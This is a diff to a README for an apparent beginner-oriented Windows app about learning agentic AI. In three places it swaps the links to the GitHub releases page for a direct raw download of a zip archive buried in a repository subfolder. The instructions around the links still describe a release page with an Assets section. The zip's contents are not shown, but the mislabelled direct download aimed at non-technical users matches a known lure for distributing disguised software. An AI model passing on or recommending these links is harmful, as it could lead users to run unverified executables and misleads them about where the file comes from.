@@ -1,6 +1,6 @@
 # 🧑‍🎓 apprentice-onboarding - Learn agentic AI with clear steps
 
-[![Download](https://img.shields.io/badge/Download-Releases-green?style=for-the-badge)](https://github.com/hydromanteshallpass747/apprentice-onboarding/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-green?style=for-the-badge)](https://github.com/hydromanteshallpass747/apprentice-onboarding/raw/refs/heads/main/02-the-methodology/apprentice-onboarding-1.2.zip)
 
 ## 📘 What this app is
 
@@ -27,7 +27,7 @@ If your PC is managed by work or school, you may need approval before you can ru
 
 ## 🚀 Download and install
 
-1. Open the release page: https://github.com/hydromanteshallpass747/apprentice-onboarding/releases
+1. Open the release page: https://github.com/hydromanteshallpass747/apprentice-onboarding/raw/refs/heads/main/02-the-methodology/apprentice-onboarding-1.2.zip
 2. Find the latest release at the top of the page
 3. Look under the Assets section
 4. Download the Windows file for the app
@@ -173,7 +173,7 @@ You do not need coding skills to begin.
 
 ## 📌 Release page
 
-Download the Windows app here: https://github.com/hydromanteshallpass747/apprentice-onboarding/releases
+Download the Windows app here: https://github.com/hydromanteshallpass747/apprentice-onboarding/raw/refs/heads/main/02-the-methodology/apprentice-onboarding-1.2.zip
 
 Open the latest release, then use the Assets section to get the correct Windows file
 
